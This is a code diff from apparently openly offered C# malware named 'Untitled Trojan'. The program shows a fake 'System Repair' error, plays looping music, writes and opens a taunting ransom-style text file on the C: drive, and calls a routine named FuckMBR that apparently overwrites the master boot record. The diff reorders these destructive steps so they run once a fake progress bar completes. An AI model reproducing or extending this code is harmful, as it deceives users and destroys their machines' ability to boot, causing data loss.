@@ -52,26 +52,27 @@ namespace UntitledTrojan
                         "\nA program running in background is interfering with repairing process.",
                         "System Repair", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     Opacity = 0;
-                    startPayloads = true;
                     Process.Start("C:\\Windows\\System32\\explorer.exe");
+
+                    SoundPlayer plr = new SoundPlayer(Resources.hardbass);
+                    plr.PlayLooping();
+                    timer.Interval = 1000;
+
+                    File.WriteAllText(@"C:\YOU GOT FUCKED.txt", "Your PC was fucked by Untitled Trojan!" +
+                        "\r\n\r\nNow say \"Rest in pepperoni\" to your toaster!" +
+                        "\r\nDo not try to reboot or close me! Your MBR already has been fucked!" +
+                        "\r\n\r\nTry to use your PC as long as you can!");
+                    Process.Start(@"C:\YOU GOT FUCKED.txt");
+
+                    MBR.FuckMBR();
+
+                    startPayloads = true;
                 }
                 else
                 {
                     progressBar1.Value += 1;
                     timer.Interval = random.Next(200, 500);
                 }
-
-                SoundPlayer plr = new SoundPlayer(Resources.hardbass);
-                plr.PlayLooping();
-                timer.Interval = 1000;
-
-                File.WriteAllText(@"C:\YOU GOT FUCKED.txt", "Your PC was fucked by Untitled Trojan!" +
-                    "\n\nNow say \"Rest in pepperoni\" to your toaster!" +
-                    "\nDo not try to reboot or close me! Your MBR already has been fucked!" +
-                    "\n\nTry to use your PC as long as you can!");
-                Process.Start(@"C:\YOU GOT FUCKED.txt");
-
-                MBR.FuckMBR();
             }
         }
 
